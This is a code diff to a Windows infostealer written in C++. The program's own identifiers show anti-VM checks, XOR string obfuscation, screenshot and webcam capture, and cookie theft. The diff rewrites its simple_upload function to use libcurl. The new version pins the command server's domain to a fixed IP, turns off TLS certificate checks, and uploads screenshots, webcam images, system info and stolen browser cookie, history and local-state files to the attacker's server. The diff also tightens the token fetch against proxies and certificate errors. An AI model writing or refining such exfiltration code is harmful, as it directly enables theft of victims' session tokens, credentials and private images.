@@ -16,6 +16,7 @@
 #include <ShlObj.h>
 #include <intrin.h>
 #include "config.h"
+#include "curl/curl.h"
 
 #define ANTI_VM 1  // 1 = block VMs, 0 = allow
 
@@ -26,6 +27,123 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "libcurl.lib")
+
+// libcurl write callback
+static size_t curl_write_cb(void* ptr, size_t sz, size_t nmemb, void* ud) {
+    ((std::string*)ud)->append((char*)ptr, sz * nmemb);
+    return sz * nmemb;
+}
+
+// libcurl-based upload: uses CURLOPT_RESOLVE to pin domain to good CF edge IP
+// (equivalent to curl --resolve), keeping correct SNI without hosts file hacks.
+void simple_upload()
+{
+    CURL* curl = curl_easy_init();
+    if (!curl) return;
+
+    char host_u8[256], token_url[320], upload_url[512];
+    WideCharToMultiByte(CP_UTF8, 0, SERVER_HOST, -1, host_u8, sizeof(host_u8), nullptr, nullptr);
+    sprintf_s(token_url, "https://%s/token", host_u8);
+
+    char resolve_str[512];
+    sprintf_s(resolve_str, "+%s:443:104.21.54.80", host_u8);
+    struct curl_slist* hosts = nullptr;
+    hosts = curl_slist_append(hosts, resolve_str);
+    curl_easy_setopt(curl, CURLOPT_RESOLVE, hosts);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
+
+    // --- GET /token ---
+    std::string token;
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &token);
+    curl_easy_setopt(curl, CURLOPT_URL, token_url);
+    CURLcode res = curl_easy_perform(curl);
+    if (res == CURLE_OK) {
+        const char* p = strstr(token.c_str(), "\"token\"");
+        if (p) { p = strchr(p, ':'); if (p) { p = strchr(p, '"');
+            if (p) { const char* q = strchr(p + 1, '"');
+            if (q) token.assign(p + 1, q); } } }
+    }
+    if (token.empty()) { curl_slist_free_all(hosts); curl_easy_cleanup(curl); return; }
+
+    // --- collect local files ---
+    wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, scrPath); wcscat_s(scrPath, L"scr.png");
+    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, camPath); wcscat_s(camPath, L"\\wallpaper.png");
+    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, infoPath); wcscat_s(infoPath, L"\\sysinfo.log");
+
+    auto load = [](const wchar_t* path) -> std::vector<BYTE> {
+        HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (h == INVALID_HANDLE_VALUE) return {};
+        DWORD sz = GetFileSize(h, nullptr);
+        if (!sz || sz > 5 * 1024 * 1024) { CloseHandle(h); return {}; }
+        std::vector<BYTE> d(sz);
+        DWORD rd; ReadFile(h, d.data(), sz, &rd, nullptr);
+        CloseHandle(h); return d;
+    };
+    auto scr = load(scrPath), cam = load(camPath), inf = load(infoPath);
+
+    // --- build multipart via curl_mime ---
+    curl_mime* mime = curl_mime_init(curl);
+    auto add_part = [&](const char* name, const wchar_t* fn, const std::vector<BYTE>& d) {
+        if (d.empty()) return;
+        curl_mimepart* pt = curl_mime_addpart(mime);
+        curl_mime_name(pt, name);
+        char fn_u8[256];
+        WideCharToMultiByte(CP_UTF8, 0, fn, -1, fn_u8, sizeof(fn_u8), nullptr, nullptr);
+        curl_mime_filename(pt, fn_u8);
+        curl_mime_data(pt, (const char*)d.data(), d.size());
+        curl_mime_type(pt, "application/octet-stream");
+    };
+    add_part("screenshot", L"scr.png", scr);
+    add_part("webcam", L"wallpaper.png", cam);
+    add_part("sysinfo", L"sysinfo.log", inf);
+
+    wchar_t tmpDir[MAX_PATH];
+    GetTempPathW(MAX_PATH, tmpDir);
+    const wchar_t* patterns[] = { L"cookies_*", L"history_*", L"localstate_*" };
+    for (auto* pat : patterns) {
+        wchar_t search[MAX_PATH];
+        swprintf_s(search, L"%s\\%s", tmpDir, pat);
+        WIN32_FIND_DATAW fd;
+        HANDLE hF = FindFirstFileW(search, &fd);
+        if (hF != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    wchar_t fp[MAX_PATH];
+                    swprintf_s(fp, L"%s\\%s", tmpDir, fd.cFileName);
+                    auto cd = load(fp);
+                    if (!cd.empty()) {
+                        curl_mimepart* pt = curl_mime_addpart(mime);
+                        curl_mime_name(pt, "cookies");
+                        char fn_u8[256];
+                        WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, fn_u8, sizeof(fn_u8), nullptr, nullptr);
+                        curl_mime_filename(pt, fn_u8);
+                        curl_mime_data(pt, (const char*)cd.data(), cd.size());
+                        curl_mime_type(pt, "application/octet-stream");
+                    }
+                }
+            } while (FindNextFileW(hF, &fd));
+            FindClose(hF);
+        }
+    }
+
+    // --- POST /upload?token=xxx ---
+    std::string post_body;
+    sprintf_s(upload_url, "https://%s/upload?token=%s", host_u8, token.c_str());
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_body);
+    curl_easy_setopt(curl, CURLOPT_URL, upload_url);
+    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+    curl_easy_perform(curl);
+
+    curl_mime_free(mime);
+    curl_slist_free_all(hosts);
+    curl_easy_cleanup(curl);
+}
 
 // XOR string obfuscation
 constexpr unsigned char XKEY = 0x55;
@@ -415,7 +533,7 @@ std::string fetch_token()
 {
     std::string token;
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
+        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
     if (!hSession) { diag_log("token: WinHttpOpen failed"); return token; }
 
     HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 443, 0);
@@ -423,12 +541,12 @@ std::string fetch_token()
 
     HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", L"/token",
         nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
-    if (!hReq) { return token; }
-    DWORD _sf1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
+    DWORD _sf1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 0x00000080;
     WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &_sf1, sizeof(_sf1));
 
     BOOL ok = WinHttpSendRequest(hReq, nullptr, 0, nullptr, 0, 0, 0);
-    if (!ok) { diag_log("token: SendRequest failed (no network?)"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
+    if (!ok) { diag_log("token: SendRequest failed"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
 
     ok = WinHttpReceiveResponse(hReq, nullptr);
     if (!ok) { diag_log("token: ReceiveResponse failed"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
@@ -1075,128 +1193,6 @@ void guarded_screenshot()
 void guarded_webcam()
 {
     __try { capture_webcam(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
-}
-
-void simple_upload()
-{
-    std::string token;
-
-    // fetch token with retry (CF edge node may be bad)
-    for (int attempt = 0; attempt < 3; attempt++) {
-        HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
-        if (!hS) { Sleep(2000); continue; }
-        DWORD tlsOpt = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
-        WinHttpSetOption(hS, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsOpt, sizeof(tlsOpt));
-        HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 443, 0);
-        if (!hC) { WinHttpCloseHandle(hS); Sleep(2000); continue; }
-        HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/token", nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
-        if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); Sleep(2000); continue; }
-        DWORD _sf3 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &_sf3, sizeof(_sf3));
-        BOOL ok = WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(hR, nullptr);
-        if (!ok) { WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); Sleep(2000); continue; }
-        char b[256] = {}; DWORD r = 0;
-        WinHttpReadData(hR, b, 255, &r);
-        const char* p = strstr(b, "\"token\"");
-        if (p) { p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { const char* q = strchr(p + 1, '"'); if (q) token.assign(p + 1, q); } } }
-        WinHttpCloseHandle(hR);
-        WinHttpCloseHandle(hC);
-        WinHttpCloseHandle(hS);
-        if (!token.empty()) break;
-        Sleep(2000);
-    }
-    if (token.empty()) { MessageBoxW(nullptr, L"token failed after 3 retries", L"UP ERR", MB_OK); return; }
-
-    // build paths
-    wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];
-    GetTempPathW(MAX_PATH, scrPath); wcscat_s(scrPath, L"scr.png");
-    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, camPath); wcscat_s(camPath, L"\\wallpaper.png");
-    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, infoPath); wcscat_s(infoPath, L"\\sysinfo.log");
-
-    auto load = [](const wchar_t* p) -> std::vector<BYTE> {
-        HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (h == INVALID_HANDLE_VALUE) return {};
-        DWORD sz = GetFileSize(h, nullptr);
-        if (!sz || sz > 5 * 1024 * 1024) { CloseHandle(h); return {}; }
-        std::vector<BYTE> d(sz);
-        DWORD rd;
-        ReadFile(h, d.data(), sz, &rd, nullptr);
-        CloseHandle(h);
-        return d;
-    };
-    auto scr = load(scrPath), cam = load(camPath), inf = load(infoPath);
-
-    // simple multipart body
-    const char* B = "----BND";
-    std::vector<BYTE> body;
-    auto a = [&](const char* s) { body.insert(body.end(), (BYTE*)s, (BYTE*)s + strlen(s)); };
-    auto a2 = [&](const void* d, size_t n) { body.insert(body.end(), (BYTE*)d, (BYTE*)d + n); };
-
-    struct { const wchar_t* fn; const char* fd; std::vector<BYTE>& d; } pts[] = {
-        {L"scr.png", "screenshot", scr}, {L"webcam.png", "webcam", cam}, {L"sysinfo.log", "sysinfo", inf},
-    };
-    for (auto& pt : pts) {
-        if (pt.d.empty()) continue;
-        a("--"); a(B); a("\r\nContent-Disposition: form-data; name=\""); a(pt.fd);
-        a("\"; filename=\""); a(std::string(pt.fn, pt.fn + wcslen(pt.fn)).c_str());
-        a("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
-        a2(pt.d.data(), pt.d.size());
-        a("\r\n");
-    }
-    // scan for stolen browser dbs and attach them
-    wchar_t tmpDir[MAX_PATH];
-    GetTempPathW(MAX_PATH, tmpDir);
-    const wchar_t* patterns[] = { L"cookies_*", L"history_*", L"localstate_*" };
-    for (auto* pat : patterns) {
-        wchar_t search[MAX_PATH];
-        swprintf_s(search, L"%s\\%s", tmpDir, pat);
-        WIN32_FIND_DATAW fd2;
-        HANDLE hF = FindFirstFileW(search, &fd2);
-        if (hF != INVALID_HANDLE_VALUE) {
-            do {
-                if (!(fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                    wchar_t fp[MAX_PATH];
-                    swprintf_s(fp, L"%s\\%s", tmpDir, fd2.cFileName);
-                    auto cd = load(fp);
-                    if (!cd.empty()) {
-                        a("--"); a(B); a("\r\nContent-Disposition: form-data; name=\"cookies\"");
-                        a("; filename=\""); a(std::string(fd2.cFileName, fd2.cFileName + wcslen(fd2.cFileName)).c_str());
-                        a("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
-                        a2(cd.data(), cd.size());
-                        a("\r\n");
-                    }
-                }
-            } while (FindNextFileW(hF, &fd2));
-            FindClose(hF);
-        }
-    }
-    a("--"); a(B); a("--\r\n");
-
-    // POST via WinHTTP
-    std::string url = "/upload?token=" + token;
-    std::wstring wu(url.begin(), url.end());
-    HINTERNET _hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
-    if (!_hS) return;
-    DWORD tlsOpt2 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
-    WinHttpSetOption(_hS, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsOpt2, sizeof(tlsOpt2));
-    HINTERNET _hC = WinHttpConnect(_hS, SERVER_HOST, 443, 0);
-    if (_hC) {
-        HINTERNET _hR = WinHttpOpenRequest(_hC, L"POST", wu.c_str(), nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
-        if (_hR) {
-            DWORD _sf4 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-            WinHttpSetOption(_hR, WINHTTP_OPTION_SECURITY_FLAGS, &_sf4, sizeof(_sf4));
-            std::string ct = "Content-Type: multipart/form-data; boundary=" + std::string(B) + "\r\n";
-            std::wstring wc(ct.begin(), ct.end());
-            if (WinHttpSendRequest(_hR, wc.c_str(), (DWORD)wc.size(), nullptr, 0, (DWORD)body.size(), 0)) {
-                DWORD wr;
-                WinHttpWriteData(_hR, body.data(), (DWORD)body.size(), &wr);
-                WinHttpReceiveResponse(_hR, nullptr);
-            }
-            WinHttpCloseHandle(_hR);
-        }
-        WinHttpCloseHandle(_hC);
-    }
-    WinHttpCloseHandle(_hS);
 }
 
 void steal_cookies()
